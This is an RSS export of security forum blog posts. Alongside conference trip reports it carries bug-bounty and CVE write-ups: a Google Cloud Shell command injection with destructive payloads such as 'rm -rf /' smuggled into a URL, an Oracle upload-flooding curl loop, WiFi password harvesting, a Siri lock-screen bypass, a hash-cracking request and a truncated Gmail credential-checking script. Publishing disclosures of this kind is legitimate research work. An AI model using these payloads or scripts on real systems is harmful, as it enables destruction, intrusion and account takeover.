<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs</title>
		<link>http://garage4hackers.com/blog.php</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 09:37:55 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs</title>
			<link>http://garage4hackers.com/blog.php</link>
		</image>
		<item>
			<title>My Nullcon Experience.</title>
			<link>http://garage4hackers.com/entry.php?b=3153</link>
			<pubDate>Tue, 28 Mar 2017 14:39:57 GMT</pubDate>
			<description>NULLCON is one of the best information security conference in India and every year everyone from the InfoSec community attends it. I have a great...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">NULLCON is one of the best information security conference in India and every year everyone from the InfoSec community attends it. I have a great interest in Security and hacking ( If you follow my blog you will probably know it already <a href="http://www.hackatrick.com" target="_blank">www.hackatrick.com</a> ) and yes I too look forward to the conference. Every year most of my friends who are into security attend NULLCON. I failed to go last year due to my Exams and last to last year i had my class 12 boards exam.<br />
<br />
This time I wanted to attend it . But then the task is not so easy. I visited NULLCON's website to buy a pass but the cost was too much ( at least for students ) And since I'm from Northeast India there is no direct flight to Goa ( NULLCON venue ) and if i take train then it would take almost 4 days to reach goa and my college won't allow to take leave for such a long duration. So the total cost of travel and event pass was way too much so i thought I'll have to drop this time too.<br />
<br />
But then i got to know about Garage4Hackers community providing free passes to those who have contributed to open source community. I was not sure if i should try or not but then i thought lets give it a try. So i provided them some of my contributions in InfoSec and and work and to my surprise I got selected and got the Indian student delegate pass for nullcon and i decided that I'LL GO TO NULLCON THIS YEAR.<br />
<br />
On 2nd march 2017 i started my journey from guwahati and reached goa via mumbai. YES FINALLY GOA. I was damn excited for the next day. <br />
<br />
Next day I reached hotel Holiday Inn at around 9am . Kaza and his friends were waiting for me and then we entered together. WOW the place was simply awesome. We directly went to the exhibition area and visited various booths that were set up there. I finally met Rahul Sasi sir. He is a great guy. He was representing his company Cloud Sec. He gave me a hackers cheat sheet and we clicked photos. <br />
<br />
There were a lot of CTFs going on in the exhibition area and I took part in few. I won a power bank, Pen drive, Lots of t-shirts from these CTFs. It was a great experience. After that I met a lot of people whom i earlier met online. <br />
<br />
Most of the talk in nullcon were great and was very informative. i attended few talks like :<br />
<br />
1. How to be successful in azure bug bounty by michael Hendrickx.<br />
2. Drone Hijacking and other IoT hacking with GNU Radio and SDR by Arthur Garipov.<br />
3. Hacking medical device and infrastructure by anirudh duggal.<br />
4. 7 sins of ATM protection against logical attacks by timur yunusov.<br />
<br />
I did not attend much talks as i was busy meeting new people, taking part in CTFs and eating :cool: . A lot of companies who are related to security came to nullcon and it was a great opportunity to know what is the latest things that are going on in security. Also I got internship offer from few of the companies that visited nullcon.<br />
<br />
I know a lot of people online who are into security and nullcon was the best platform to meet them in person also I made lots of friends there. <br />
<br />
Conclusion<br />
<br />
It was a great experience. Many people say that we can watch the talk online too why to spend so much money going to conference? the thing is the experience that we get when we visit conferences like is something that cannot be get just by watching the talk videos. <b>I would like to thank all the awesome people of Garage4Hackers for giving me the pass as without it I might have not been able to make it this year too</b>. THANK YOU</blockquote>

]]></content:encoded>
			<dc:creator>Indrajeet</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3153</guid>
		</item>
		<item>
			<title>First Nullcon Experience</title>
			<link>http://garage4hackers.com/entry.php?b=3152</link>
			<pubDate>Thu, 16 Mar 2017 14:49:31 GMT</pubDate>
			<description>i was a part of infosec community for over a year. And many times i came across the people who told me about this amazing tech convention which was...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">i was a part of infosec community for over a year. And many times i came across the people who told me about this amazing tech convention which was held in Goa march every year. This got me really excited for the NULLCON.<br />
<br />
So i did little research about nullcon and how to get entry in this event. So i got to know that there ware passes available to get in the event. But at that time i was not able to afford the passes so i dropped the idea to go in nullcon. But later on i heard about the Garage4Hackers community providing free passes to those who have contributed to open source community. As i was a member of Garage4Hackers community for quite some time. So, i provided them some of my open source contribution and i am glad that they choosed me for the free passes of nullcon.<br />
<br />
Now i have the free passes to nullcon so the excitement level was very high. Apart from passes going to Goa wasn't a easy task for me. And for that i took a break from my college and on going projects. So that i can focus on bug bounties and i can say that odds were in my favor because at the end of the day i had sufficient amount to go to Goa.<br />
<br />
On 28th Feb i took a bus from Kota to Indore and then i got on the flight from Indore to Goa. And the journey took me about 21 hrs to get to the hotel in Goa.<br />
<br />
On 3rd march the first day of nullcon 2017 begin. I went to nullcon location at holiday inn resort, Goa. And the crowd present there got me more excited. Then i moved to the booth to collect my free pass, along with free pass i got a goodies bag. And now this was the moment, for which i have waited a long time.<br />
<br />
At the gate, i met sandeep sir and it was great to see some familiar faces, as we have already worked together at secureLyaer7 for quite a while. So we got along and then we head towards the hall-A where the opening note was about to begin.<br />
<br />
After the opening note a keynote on  Silicon: Security's New Layer by Joshua Pennel was quite informative. And then Mr. Michael Hendrickx from Microsoft discussed on How to be successful in the Azure bug bounty program. He explained the entire Azure architecture as well as reports from other researchers. Mr. Jack Whitton from Facebook told about increasing impacts on Facebook bug bounty program. Previously i have studied many of bug reports submitted to Facebook from different resources. Apart from those, he disclosed some amazing bug reports. And also he gave instructions on how to submit bug reports on Facebook.<br />
<br />
Google talk begun at 2PM on great bugs in google VRP in 2016 by Karshan Sharma and Martin Straka. As a security researcher, i have encountered some bugs and submitted to google but after their talk i was amazed to see how creative the people were who have submitted bugs in google. And this was the point, where i realized, its a long road ahead and to be able to reach at that level, i need to keep on going. So, clearly this was the best talk of the nullcon 2017.<br />
<br />
Then Adam Bacchus, chief bounty officer at hackerone explained how the bug reporting mechanism work. This was again an awesome topic because the people who submit bugs need to know about the process that follows after the bug submission.<br />
<br />
After the presention of Adam Bacchus there was a 30 min break and then i got to meet with <a href="https://twitter.com/emgeekboy" target="_blank">Geekboy</a>, the one guy who has helped me alot in bug bounties.<br />
It always amazed me that a guy at a level of him is always ready to help. And then i was setting in hall for the next session to begin, when i realized that the person in the crowd that was in front of me is Mr. Karshan Sharma who gave an excellent talk on great bugs in google VRP. So, i approached him, And he was really nice. He told me about his journey from being a security engineer to a google employ. And i got to know about how things work at google. And how much of the work they need to automate. Then, i asked him how can i apply in google. Then he explained me about the procedure and then we talk about me and my achievements. It was my privilege to meet such a nice guy and this happened to me because of nullcon so i thank all the people who made this possible.<br />
<br />
After the break, Mr Faraz from bugcrowd gave an interesting presentation on how to interact with bug bounty programs. Through a simple presentation he explained the bug bounty programs and their working. And this was the end of day 1 at nullcon 2017. But not for me then i met with nilesh sir for the first time. We have met on Facebook and he always motivates me and meeting him was such a great surprise we discussed about first day at nullcon and he experience in infosec community. Then i was on my way back to hotel.<br />
<br />
<b>DAY 2</b><br />
<br />
After the great experience of day 1, i expected highly of day 2 but the talks of day 2 were not upto the mark that was set on the day 1. So, i decided to go for CTF challenges. Then it was the time to meet Garage4Hackers gang. So the Garage4Hackers gang gathered at the decided place, Then sandeep sir introduced me with some senior members of Garage4Hackers later he talked about the ranchoddas webcast series and asked for our opinion to make it better. As well, he gave us responsibility to continue to forum after them. After that the whole Garage4Hackers team went to grab lunch together. Time passed quickly and soon, it was the time for last talk of day 2. and we decided to go for it. it was about injection security into webapps with runtime patching and context learning by Ajin Abraham.<br />
<br />
In the evening i was invited to the party organised by secureLyaer7 but due to some reasons i decided to head back to hotel.<br />
And on 6th Feb, i took the flight from Goa to Indore.<br />
<br />
<b>Overall Experience</b><br />
<br />
Entirely this whole journey was a great experience. And i appreciate the people who have organised nullcon because its a great way to bring the people of infosec community together. Nullcon benefits all kind of people even if he is beginner, intermediate or expert. But even nullcon isn't perfect. People goto these conventions with hope to share their knowledge and to learn from other members of community while some members don't share and help other people. And the only thing that can make the nullcon perfect is the people. So i would like to say to all who went to nullcon this year or wish to go in upcoming years, don't hold back. Help everyone and share your achievements and experience. Not only this will make you grow as a infosec researcher but as <br />
a human being too. And then we would have the best nullcon ever.</blockquote>

]]></content:encoded>
			<dc:creator>C0d3G33k</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3152</guid>
		</item>
		<item>
			<title>Cracking  WIFI</title>
			<link>http://garage4hackers.com/entry.php?b=3150</link>
			<pubDate>Tue, 14 Feb 2017 09:25:45 GMT</pubDate>
			<description>Hello, I am Double Chow.The purpose of establishing WeChat Subscription is to share knowledge about cyber security ,simple but very fun that we maybe...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hello, I am Double Chow.The purpose of establishing WeChat Subscription is to share knowledge about cyber security ,simple but very fun that we maybe often used in daily life .Today, we share an article about cracking WIFI. The most simple way:  use  third party interface to crack  WIFI, whcih is called  the first step to break our village WIFI. In order to facilitate the application in the actual scene,I put all the operations on the phone as possible .The first step,  WarDriving collect  WIFI information, tools download address: <a href="https://wigle.net/tools" target="_blank">https://wigle.net/tools</a>, this tool can collect WIFI SSID, BSSID and GPS, then  export CVs and KML file , use Google earth  open the KML file,  finally, the map will mark the WIFI information, as shown below:<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=867&amp;d=1487064062" border="0" alt="Name:  image002.jpg
Views: 195
Size:  35.4 KB"  /><br />
 <br />
The second step, to break the third party interface, I started to use WIFI master key interface to batch break, but the software updates, the former interface is unusable. To reverse this software, in the reverse process, I found a more simple method, <a href="http://www.wifi4.cn/" target="_blank">http://www.wifi4.cn/</a> this website is used to check whether the WIFI password leak or not, it is achieved through some third party WIFI sharing APP interface , but it is  made restrictions on the number of queries, as follows:<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=868&amp;d=1487064080" border="0" alt="Name:  image004.jpg
Views: 191
Size:  16.3 KB"  /><br />
 <br />
In batch WIFI queries, only 12 WIFI per query are given, as shown below:<br />
 <img src="http://garage4hackers.com/attachment.php?attachmentid=869&amp;d=1487064099" border="0" alt="Name:  image006.jpg
Views: 183
Size:  14.6 KB"  /><br />
<br />
To analyze capture pocket,  it use  JavaScript to limit 12 number of  WIFI, and no limit on the number of back-end. What is more,  the returned  results have made Duplicate removal on the WIFI data. we can use this interface to all one-time collection of the WIFI in the query interface code. I have written the code address: <a href="https://dazhouzhou.github.io/code/crack.py" target="_blank">https://dazhouzhou.github.io/code/crack.py</a> Now we can use a mobile phone to try to test the WIFI security, the specific operation of the video  as below:<br />
<img src="http://garage4hackers.com/attachment.php?attachmentid=870&amp;d=1487064122" border="0" alt="Name:  image008.jpg
Views: 186
Size:  20.4 KB"  /><br />
 <br />
I hope this article will be helpful to you. WeChat Subscription is  not updated regularly, because I may be very busy . If you have interests, you can contact me, my email is  <a href="mailto:doublechow@zerodaytechnology.com">doublechow@zerodaytechnology.com</a>.</blockquote>

]]></content:encoded>
			<dc:creator>chris84</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3150</guid>
		</item>
		<item>
			<title>HITBCONF2017 - A DEEP-KNOWLEDGE SECURITY EVENT… Registrations and CFP open now!</title>
			<link>http://garage4hackers.com/entry.php?b=3146</link>
			<pubDate>Wed, 26 Oct 2016 08:04:41 GMT</pubDate>
			<description>Attachment 854 (http://garage4hackers.com/attachment.php?attachmentid=854) 
 
*We are glad to announce that Garage4hackers is now a community partner...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><img src="http://garage4hackers.com/attachment.php?attachmentid=854&amp;d=1477468384" border="0" alt="Name:  hitbg4h.jpg
Views: 3932
Size:  17.1 KB"  /><br />
<br />
<b>We are glad to announce that Garage4hackers is now a community partner for <a href="https://conference.hitb.org/" target="_blank">Hack In The Box Security Conference </a></b><br />
<br />
<br />
<b><u>WHAT?</u></b><br />
<br />
<a href="https://conference.hitb.org" target="_blank">HITBSecConf2017 - Amsterdam</a>   <br />
Early Bird Registration Closes 31st December. <a href="http://conference.hitb.org/hitbsecconf2017ams/register/" target="_blank">Register now and save!</a><br />
<br />
<br />
<b><u>WHEN &amp; WHERE?</u></b><br />
<br />
The Netherlands taking place on April 10th – 14th at the NH Grand Krasnapolsky in Amsterdam.<br />
<br />
<br />
<b><u>WHAT's IN IT FOR ME?</u></b><br />
<br />
All-new 3 and 2-day hands on training classes, a triple track security conference, CommSec technology exhibition area plus CTF competition, a free-to-access track of 30 and 60 minute community talks (in association with iamthecavalry) and much, much more!<br />
<br />
<br />
<b><u>WHY ATTEND?</u></b><br />
<br />
You get a  chance to meet with some of the worlds' leading security experts and opportunity to develop new professional relationships and alliances also to keep yourself updated with the ever changing computer security industry.<br />
<br />
<br />
<b><u>CALL FOR PAPERS</u></b><br />
<br />
The Call for Papers for the conference is now open and the first round of accepted speakers will be announced in the first week of January. As always, do follow @HITBSecConf on Twitter for the latest event updates If you have a new research and ever before seen attack and defense methods then kindly register yourself on the link below and send summary of your research.<br />
<a href="https://cfp.hackinthebox.org/" target="_blank">https://cfp.hackinthebox.org/</a><br />
<br />
<br />
<b><u>ABOUT HITBSECCONF</u></b><br />
<br />
Hack In The Box Security Conference is an annual event for security researchers and professionals across the globe. Held annually in Kuala Lumpur, Malaysia and Amsterdam in the Netherlands. It is a platform for the discussion and dissemination of next generation computer security issues. The events also feature two days of training and a two-day multi-track conference featuring cutting-edge hardcode technical talks delivered by some of the most respected computer security researchers in the industry. At the conf ideas are exchanged, talent discovered and genius celebrated.</blockquote>


<!-- attachments -->
	<div class="blogattachments">
		
		
			<fieldset class="blogcontent">
				<legend>Attached Images</legend>
				
			</fieldset>
		
		
		

	</div>
<!-- / attachments -->
]]></content:encoded>
			<dc:creator>cipher</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3146</guid>
		</item>
		<item>
			<title>(CVE-2016-8856) Foxit Reader for Linux and Mac: Local Privilege Escalation Writeup</title>
			<link>http://garage4hackers.com/entry.php?b=3145</link>
			<pubDate>Thu, 20 Oct 2016 12:34:22 GMT</pubDate>
			<description>Hi guys, 
 
Recently, I stumbled on a very simple bug in Foxit Reader for Mac and Linux (From here on, just Foxit Reader). The vulnerability was...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hi guys,<br />
<br />
Recently, I stumbled on a very simple bug in Foxit Reader for Mac and Linux (From here on, just Foxit Reader). The vulnerability was caused by improper file permissions granted on core Foxit Reader's files on Linux and Mac systems. An attacker with a low privilege access could've exploited this vulnerability to elevate their privileges, execute commands as a higher privileged user, or both.<br />
<br />
The version affected were:<br />
<br />
Foxit Reader for Mac 2.1.0.0804 and earlier<br />
Foxit Reader for Linux 2.1.0.0805 and earlier<br />
Fixed version has been released and security bulletin is published here - <a href="https://www.foxitsoftware.com/support/security-bulletins.php" target="_blank">https://www.foxitsoftware.com/suppor...-bulletins.php</a>.<br />
<br />
The issue has been assigned CVE-2016-8856.<br />
<br />
I have written a detailed analysis on my blog here - <a href="https://c0d.ist/cve-2016-8856-foxit-reader-local-privilege-escalation-writeup/" target="_blank">https://c0d.ist/cve-2016-8856-foxit-...ation-writeup/</a>.<br />
<br />
Cheers,<br />
c0dist</blockquote>

]]></content:encoded>
			<dc:creator>c0dist</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3145</guid>
		</item>
		<item>
			<title>Command Injection in #Google for which I got 6000$</title>
			<link>http://garage4hackers.com/entry.php?b=3139</link>
			<pubDate>Wed, 16 Mar 2016 08:34:00 GMT</pubDate>
			<description><![CDATA[Hey all , 
 
Few months back I found a command injection bug in Google Cloud shell  
 
Since the title goes by the name "command injection" , you all...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hey all ,<br />
<br />
Few months back I found a command injection bug in Google Cloud shell <br />
<br />
Since the title goes by the name &quot;command injection&quot; , you all might be thinking it as &quot;normal Command injection which affects servers&quot;  but this vulnerability is quite different.<br />
We can put this in different way as &quot;Client Side command injection&quot;.<br />
<br />
Lets get into the finding<br />
<br />
While I was testing &quot;console.cloud.google.com&quot; , There was one url with this pattern<br />
<br />
https://console.cloud.google.com/home/dashboard?project=&quot;name of the project&quot; <br />
<br />
Ok thats cool :v , <br />
<br />
Tested for IDOR ,<br />
<br />
Crafted the url as<br />
https://console.cloud.google.com/home/dashboard?project=&quot;Random project name&quot;<br />
<br />
Eg:<br />
<a href="https://console.cloud.google.com/home/dashboard?project=project-1" target="_blank">https://console.cloud.google.com/hom...ject=project-1</a>  (not vulnerable to IDOR)<br />
<br />
But reflected the name of project in Cloud shell.<br />
<br />
<br />
So Tested for XSS ,<br />
<br />
Crafted the url as <br />
https://console.cloud.google.com/home/dashboard?project=&quot;XSS vector&quot; (not vulnerable to XSS)<br />
<br />
On activating cloud shell &quot;there was some syntax error&quot;<br />
<br />
Now the creepy mind of  mine came with idea :P to use delimiter ,<br />
<br />
Crafted the url as ,<br />
<a href="https://console.cloud.google.com/home/dashboard?project=;" target="_blank">https://console.cloud.google.com/hom...oard?project=;</a><br />
<br />
There was no syntax error , and  cloudshell created successfully!<br />
<br />
In linux we can chain commands using semi colon operator , <br />
<br />
To make this as exploitable issue , I came with these ideas,,<br />
<br />
Crashing Victim vm :<br />
<br />
<a href="https://console.cloud.google.com/home/dashboard?project=;sudo" target="_blank">https://console.cloud.google.com/hom...?project=;sudo</a> cp /dev/zero /dev/mem<br />
Once victim access the above url and click &quot;Activate cloud shell&quot; , his/her vm crashes.<br />
<br />
<br />
Deleting files: (this one had much impact than previous command)<br />
<br />
<a href="https://console.cloud.google.com/home/dashboard?project=;sudo" target="_blank">https://console.cloud.google.com/hom...?project=;sudo</a> rm -rf /  <br />
This will delete victims root directory which also deletes appengine files!<br />
<br />
According to my research: Once the victim access the crafted url , Victim must click &quot;Activate cloud shell&quot; , in order to make the attack successful!<br />
<br />
For more details and poc:<br />
<br />
You can refer here-&gt;<br />
<br />
<a href="http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html" target="_blank">http://www.pranav-venkat.com/2016/03...t-me-6000.html</a><br />
<br />
a</blockquote>

]]></content:encoded>
			<dc:creator>Pranav venkat</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3139</guid>
		</item>
		<item>
			<title>Crack Password from Salted Hash</title>
			<link>http://garage4hackers.com/entry.php?b=3133</link>
			<pubDate>Thu, 22 Oct 2015 03:39:10 GMT</pubDate>
			<description>Hi ya, 
 
I have some work to do. I have some salted hashed files from the dump MySql database. I need to crack the password from the salted hashed...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hi ya,<br />
<br />
I have some work to do. I have some salted hashed files from the dump MySql database. I need to crack the password from the salted hashed files. I have used hashcat, findmyhash and many more other things to crack but unsuccessful. So need your help. If anyone can help me, i will really appreciate this. I only have one day left. Here is the salted :<br />
2834da08d58330d8dafbb2ac1c0f85f6b3b135ef<br />
92e54f10103a3c511853c7098c04141f114719c1<br />
437fbc6892b38db6ac5bdbe2eab3f7bc924527d9<br />
fafa4483874ec051989d53e1e432ba3a6c6b9143<br />
06f6fe0f73c6e197ee43eff4e5f7d10fb9e438b2<br />
f44f3b09df53c1c11273def13cacd8922a86d48c<br />
<br />
I used hash identifier, it showed SHA1 <br />
<br />
if you need more info let me know.<br />
<br />
Thanks</blockquote>

]]></content:encoded>
			<dc:creator>bhathal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3133</guid>
		</item>
		<item>
			<title>CVE-2015-2652 – Unauthenticated File Upload in Oracle E-business Suite.</title>
			<link>http://garage4hackers.com/entry.php?b=3130</link>
			<pubDate>Mon, 20 Jul 2015 13:56:47 GMT</pubDate>
			<description><![CDATA[---Quote (Originally by [s])--- 
During my regular job, I unravelled an interesting vulnerability of Unauthenticated File Upload in Oracle E-business...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore"><div class="bbcode_container">
	<div class="bbcode_quote">
		<div class="quote_container">
			<div class="bbcode_quote_container"></div>
			
				<div class="bbcode_postedby">
					<img src="images/misc/quote_icon.png" alt="Quote" /> Originally Posted by <strong>[s]</strong>
					<a href="showthread.php?p=14311#post14311" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost-right.png" alt="View Post" /></a>
				</div>
				<div class="message">During my regular job, I unravelled an interesting vulnerability of Unauthenticated File Upload in Oracle E-business Suite 0-day vulnerability. This particular Upload Bug can be easily used to upload files on the web-server and also an attacker can flood the hard-disk of the server,thus making it easier for an attacker to leverage the vulnerability remotely.<br />
<br />
Oracle released Critical Patch Update containing security fixes for the Oracle E-Business Suite. This vulnerability is remotely exploitable without requiring any kind of authentication , i.e. exploited over the network without the need for any valid username credentials.<br />
<br />
<b>Introduction</b><br />
<br />
Oracle E-Business Suite is a fully integrated, comprehensive suite of business applications for the enterprise. Following purposes most of organization uses Oracle E-business.<br />
<br />
    Customer Relationship Management<br />
    Financial Management<br />
    Financial Management<br />
    Human Capital Management<br />
    Project Portfolio Management<br />
    Advanced Procurement<br />
    Supply Chain Management<br />
    Service Management<br />
<br />
<b>Vulnerable Version</b><br />
<br />
Oracle E-Business Suite, version(s) 11.5.10.2, 12.0.6, 12.1.1, 12.1.2, 12.1.3, 12.2.3, 12.2.4<br />
<br />
<b>Brief About bug</b><br />
<br />
The unauthenticated upload vulnerability resides in Oracle Marketing component.  If you search in Google for Oracle E-business, you will find more than 30K unique search results.<br />
<br />
The file is uploaded into a table in the E-Business Suite database schema.  The attacker,however, can use it to fill up the existing table space. Upload functionality allows the attacker to upload any arbitrary file types(All executables) and also allows to execute the uploaded code.<br />
<br />
POC Raw code for feeding files files to server to :<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:108px;">for ($x=1; $x &lt; 100; $x++):
curl -i -s -k  -X 'POST' \
    -H 'Origin: http://Oracle-Application:Port' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywS9xiTn7rP23Fori' -H 'Referer: http://Oracle-Application:Port/OA_HTML/amsImageSelect.jsp' \
    -b 'JSESSIONID=6e66b3f234234234272c18909d2bca0c96bf7c.kdsnfksjdfn34rk32; PROD_pses=PROD%3DHcqumhXKzuUX0xNEIjoeFKu8hZ%7E; PROD=HcqumhXKzuUX0xNEIjoeFKu8hZ; oracle.uix=0^^GMT+4:00^p' \
    --data-binary $'------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;type\&quot;\x0d\x0a\x0d\x0aF\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;FileInput\&quot;; filename=\&quot;Check.txt\&quot;\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;fileId\&quot;\x0d\x0a\x0d\x0anull\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori\x0d\x0aContent-Disposition: form-data; name=\&quot;url\&quot;\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundarywS9xiTn7rP23Fori--\x0d\x0a' \
    'http://Oracle-Application:Port//OA_HTML/amsImageUpload.jsp?dummy=1&amp;jttst0=6_22646%2C22646%2C-1%2C0%2C&amp;jtfm0=&amp;etfm1=&amp;jfn=ZG01DFBB7BC079CDE282F4716CF2E5B140454CA599F18AD7A2CAD711D30D5FB60DF18438A1D10EB7BD7CF1370CF9D979BDA7&amp;oas=ddrqZePQ82zVbJrUIG7jrw..&amp;JSSetFunctionName=null&amp;elemName=null'
end for;</pre>
</div><b>Vulnerability Information</b><br />
<br />
By using the following URLs the attacker can use it to upload files on the server.<br />
<br />
<a href="http://ORACLE-WebServer:Port/OA_HTML/amsImageSelect.jsp" target="_blank">http://ORACLE-WebServer:Port/OA_HTML/amsImageSelect.jsp</a><br />
<a href="http://ORACLE-WebServer:Port/OA_HTML/amsImageUpload.jsp" target="_blank">http://ORACLE-WebServer:Port/OA_HTML/amsImageUpload.jsp</a><br />
<br />
Oracle E-business-vulnerability<br />
<br />
For the security reasons we are not releasing uploaded file path.<br />
<br />
<b>Timeline</b><br />
<br />
May 7, 2015 :  Identification of the vulnerability<br />
May 8, 2015 :  Reported to the Oracle Security Team<br />
May 12, 2015: Confirmed Upload Vulnerability in Oracle E-business<br />
May 22, 2015 :Upload Vulnerability Patched<br />
May 22, 2015 : CPU Scheduled for Critical Update<br />
July 13, 2015 : CVE Allocated CVE-2015-2652<br />
July 14, 2015 : Critical Update Pushed<br />
July 15, 2015 : Vulnerability Made Public<br />
<br />
<b>Mitigation</b><br />
<br />
Update Oracle E-business Suit to latest version.<br />
<br />
Source: <a href="http://blog.securelayer7.net/cve-2015-2652-unauthenticated-file-upload-in-oracle-e-business-suite/" target="_blank">http://blog.securelayer7.net/cve-201...usiness-suite/</a></div>
			
		</div>
	</div>
</div></blockquote>

]]></content:encoded>
			<dc:creator><![CDATA[[s]]]></dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3130</guid>
		</item>
		<item>
			<title>How to Bypass iPhone 6+ IOS 8.3 Emergency Call</title>
			<link>http://garage4hackers.com/entry.php?b=3129</link>
			<pubDate>Fri, 29 May 2015 15:32:47 GMT</pubDate>
			<description>Hello Guys, After several days I was busy at work, I come back with a new subject which you can see on top of this text. Before I start, I’ve to say...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hello Guys, After several days I was busy at work, I come back with a new subject which you can see on top of this text. Before I start, I’ve to say my IOS is updated and version is 8.3. Keep reading to know more.<br />
<br />
I don’t want make it hard to be understood, so I explain it basic and fast. All you need to do is to turn on WiFi or mobile internet data and lock the screen, as you can see, iPhone just let you to call emergency numbers [example: 911]. Now you hold the “Home” button and let Siri come up, Tell Siri to call anyone or any number.<br />
<br />
For Example:<br />
“Hey Siri, Call 09392841331”<br />
“Call John”<br />
“Call my father”<br />
And also you can see the last number , whom you called and see your number [saved on contact]. To know better , <a href="https://www.youtube.com/watch?v=WY4x-cWeDvI&amp;feature=youtu.be" target="_blank">visit video on youtube</a>.<br />
Thanks.<br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/WY4x-cWeDvI?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<br />
<b><font size="3">Reference</font></b><br />
<br />
1- <a href="http://www.z3r0d4y.com/" target="_blank">ZCR ZeroDay Cyber Research</a><br />
<br />
<b>Ali Razmjoo</b></blockquote>

]]></content:encoded>
			<dc:creator>G3n3Rall</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3129</guid>
		</item>
		<item>
			<title>Google Bug: Gmail 2-Step Verification Detector</title>
			<link>http://garage4hackers.com/entry.php?b=3128</link>
			<pubDate>Fri, 29 May 2015 15:28:32 GMT</pubDate>
			<description><![CDATA[Hello world! [ Including People , Robots, Zombies Dariush & Arash, Alien dudes if they exist, and my friends ], By the way, I decided to write about...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hello world! [ Including People , Robots, Zombies <font size="1">Dariush &amp; Arash</font>, Alien dudes if they exist, and my friends ], By the way, I decided to write about a Gmail Bug. It’s not a vulnerability of Gmail but it’s some kind of bug let us know if we hack a Gmail, we can login it or not without alert the Gmail owner. I talking about 2-Step verification, Imagine to grab a Gmail password and not be sure to login or not , victim might be use Gmail SMS auth service and when you click login, Google send victim a SMS which include a code to continue login. I got some way to test Gmail account before we login and test it if account have notification or not without any alert SMS. Keep reading to know how to do it.<br />
<br />
<br />
As we know , Google SMTP can be used to login Gmail from anywhere .so we login from there[SMTP] and check what Gmail SMTP return to us. So now I use a python code to login my account that I activated 2-step protection on that and if anyone login, it should send me a SMS.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:168px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#!/usr/bin/python2.7<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/gmail.py<br /></span><span style="color: #0000BB">import&nbsp;smtplib<br />user&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'xxx@gmail.com'<br /></span><span style="color: #0000BB">passw&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'xxx'<br /></span><span style="color: #0000BB">smtp_host&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'smtp.gmail.com'<br /></span><span style="color: #0000BB">smtp_port&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">587<br />server&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTP</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">connect</span><span style="color: #007700">(</span><span style="color: #0000BB">smtp_host</span><span style="color: #007700">,</span><span style="color: #0000BB">smtp_port</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">ehlo</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">starttls</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: 